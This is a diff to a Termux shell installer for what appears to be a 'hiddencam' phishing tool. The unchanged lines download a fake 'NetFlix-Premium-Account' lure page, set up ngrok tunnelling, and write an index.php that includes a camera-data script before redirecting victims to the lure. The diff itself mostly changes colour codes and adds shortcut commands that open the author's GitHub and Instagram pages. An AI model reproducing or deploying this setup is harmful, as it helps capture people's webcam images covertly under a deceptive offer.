@@ -15,7 +15,7 @@ printf "\e[0m\e[1;93m    Created By HTR-TECH \e[0m\e[1;91m(\e[0m\e[1;92mTahmid R
 }
 banner
 printf " \n"
-printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;93m Installing Packages...\e[0m\n"
+printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installing Packages...\e[0m\n"
 printf " \n"
 pkg install curl php python2 openssh unzip -y
 
@@ -55,9 +55,19 @@ else
 curl -o .www/NetFlix-Premium-Account.html https://raw.githubusercontent.com/htr-tech/htr-tech.github.io/master/release-download/hiddencam/log3.log > /dev/null 2>&1
 fi
 
+echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/htr-tech
+echo 'termux-open-url https://github.com/htr-tech/' > /data/data/com.termux/files/usr/bin/HTR-TECH
+echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/instagram
+echo 'termux-open-url https://www.instagram.com/tahmid.rayat/' > /data/data/com.termux/files/usr/bin/Instagram
+chmod +x /data/data/com.termux/files/usr/bin/htr-tech
+chmod +x /data/data/com.termux/files/usr/bin/HTR-TECH
+chmod +x /data/data/com.termux/files/usr/bin/instagram
+chmod +x /data/data/com.termux/files/usr/bin/Instagram
+
+
 banner
 printf " \n"
-printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;93m Initializing...\e[0m\n"
+printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Initializing...\e[0m\n"
 printf " \n"
 
 if [[ -e .www/ngrok ]]; then
@@ -93,7 +103,7 @@ fi
 printf "<?php\ninclude '.camdata.php';\nheader('Location: NetFlix-Premium-Account.html');\nexit\n?>\n" > .www/index.php
 
 printf " \n"
-printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;93m Installation Completed ...\e[0m\n"
+printf " \e[0m\e[1;91m[\e[0m\e[1;97m~\e[0m\e[1;91m]\e[0m\e[1;92m Installation Completed ...\e[0m\n"
 sleep 2
 printf "\e[0m\n"
 printf "\e[0m\n"
